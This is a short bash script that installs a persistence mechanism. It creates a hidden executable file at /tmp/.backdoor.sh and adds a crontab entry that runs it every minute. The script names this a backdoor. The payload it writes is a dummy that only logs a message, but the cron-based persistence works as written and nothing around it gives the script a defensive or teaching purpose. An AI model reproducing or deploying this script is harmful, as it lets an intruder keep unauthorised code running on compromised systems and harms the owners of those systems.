#!/bin/bash
# -----------------------------------------------------------------------------
# Adds a cron job that executes a payload every minute.
# -----------------------------------------------------------------------------

PAYLOAD="/tmp/.backdoor.sh"
CRON_CMD="* * * * * /bin/bash $PAYLOAD"

# Create a dummy payload if it doesn't exist
if [ ! -f "$PAYLOAD" ]; then
    echo "#!/bin/bash" > "$PAYLOAD"
    echo "echo 'Backdoor running' >> /tmp/backdoor.log" >> "$PAYLOAD"
    chmod +x "$PAYLOAD"
    echo "[+] Created dummy payload at $PAYLOAD"
fi

# Add to crontab
( crontab -l 2>/dev/null; echo "$CRON_CMD" ) | crontab -
echo "[+] Added cron job: $CRON_CMD"
